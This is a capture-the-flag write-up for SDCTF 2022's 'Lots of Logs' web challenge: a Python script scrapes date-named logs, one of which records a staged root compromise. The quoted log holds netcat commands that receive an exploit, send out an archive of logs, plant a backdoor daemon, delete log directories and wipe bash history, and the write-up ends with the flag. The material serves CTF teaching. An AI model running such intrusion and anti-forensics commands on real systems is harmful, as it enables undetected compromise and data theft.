# Lots of Logs

```
score: 175
solved: xx/xx
difficulty: easy
tags: web
```

## Problem

As a professional logger, I made an extensive logger that logs all of the logs I log to the blog I blog so that no log goes unlogged. I post some logs to the log catalog on my log blog.
Website
https://logs.sdc.tf/

https://github.com/acmucsd/sdctf-2022/tree/main/web/easy%20-%20lots%20of%20logs

## Got the flag

Go to https://logs.sdc.tf, read https://logs.sdc.tf/js/index.js (after formatting), we know that logs are named after their date.

Going back from 2021-7-31 and forward from 2022-3-9 every one day, we know that logs are created from 2016-10-29 to 2022-4-20

Write a python script to get and merge all logs into one (it won't be too large to read):
```python
from datetime import date, timedelta
days_of_week = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']
start_date = date(2016, 10, 29)
end_date = date(2022, 4, 20)
duration = end_date - start_date
for i in range(duration.days):
    d = start_date + timedelta(days=i)
    url = f"https://logs.sdc.tf/logs/{d.year}/{d.month}/{d.day}/{days_of_week[d.weekday()]}.log"
    print(i, url)
    r = requests.get(url)
    if r.status_code == 200:
        with open("all_logs.log", "a") as f:
            f.write(r.text)
```

Then, search the logs for any sign (`sd` in `sdctf` or `{` if flag is already in logs), we get these lines on 2018-6-13, a day when logs are chopped incorrectly by pressing ^C:

```
Wed 06/13 12:18:35 LOG   : 11 logs logged!
Wed 06/13 12:19:16 LOG   : 5 logs logged!
Wed 06/13 12:20:13 LOG   : ^C

john@logger:~# nc -l 1337 > exploit
john@logger:~# chmod +x exploit
john@logger:~# ./exploit
# whoami
root
# ls
exploit  logs  site
# ls logs
2016  2017  2018
# tar -cf data.tar.gz ~/logs
tar: Removing leading `/' from member names
tar: /home/john/data.tar.gz: file is the archive; not dumped
# nc -l 1337 < data.tar.gz
# rm -rf /home/john/logs/2018/6/10 /home/john/logs/2018/6/11 /home/john/logs/2018/6/12
# rm data.tar.gz
# mkdir /lib/network
# nc -l 1337 > /lib/network/daemon
# chmod +x /lib/network/daemon
# /lib/network/daemon
Success... running on port 1338
# nc logger.sdc.tf 1338
Pass: 82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d
ls /home/john
exploit  logs  site
^C
# rm exploit
# echo "" > .bash_history
# echo "" > ~/.bash_history
# exit
john@logger:~# ./logger

Wed 06/13 12:55:03 START : ************************** STARTING LOGGING **************************

```

Just copy paste nc command and password, we get flag:
```
$ nc logger.sdc.tf 1338
Pass: 82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d
sdctf{b3tr4y3d_by_th3_l0gs_8a4dfd}
```
